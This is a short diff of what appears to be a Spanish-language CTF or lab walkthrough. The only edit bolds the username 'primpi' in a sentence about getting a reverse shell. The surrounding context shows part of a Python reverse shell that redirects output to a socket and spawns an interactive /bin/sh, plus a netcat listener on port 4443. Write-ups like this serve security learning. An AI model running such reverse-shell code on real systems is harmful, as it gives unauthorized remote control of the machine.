@@ -79,7 +79,7 @@ os.dup2(s.fileno(), 1)
 os.dup2(s.fileno(), 2)
 p = subprocess.call(["/bin/sh", "-i"])
 ```
-Una vez lo lanzamos ya establemos la reverse shell con el usuario primpi.
+Una vez lo lanzamos ya establemos la reverse shell con el usuario **primpi**.
 ```
 ❯ nc -lvnp 4443
 listening on [any] 4443 ...
